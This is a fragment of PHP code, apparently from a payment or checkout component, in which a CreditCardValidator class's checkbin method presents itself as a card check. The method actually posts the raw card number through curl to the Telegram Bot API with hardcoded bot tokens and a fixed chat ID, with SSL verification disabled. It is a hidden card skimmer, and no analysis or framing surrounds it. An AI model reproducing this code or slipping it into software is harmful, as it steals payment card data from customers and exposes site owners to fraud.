...
class CreditCardValidator {
	...
	function checkbin($cc) {
	
    $ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1025365979:AAFUf5Pv3LxaiTBr2LF7M_5LRkVk364d15A/sendMessage');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=987844231&text=".$cc."");
...
curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1137613204:AAHcUOH2oz-gNKo1R9rf1cO5ddzmwTAUuRw/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=987844231&text=".$cc."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
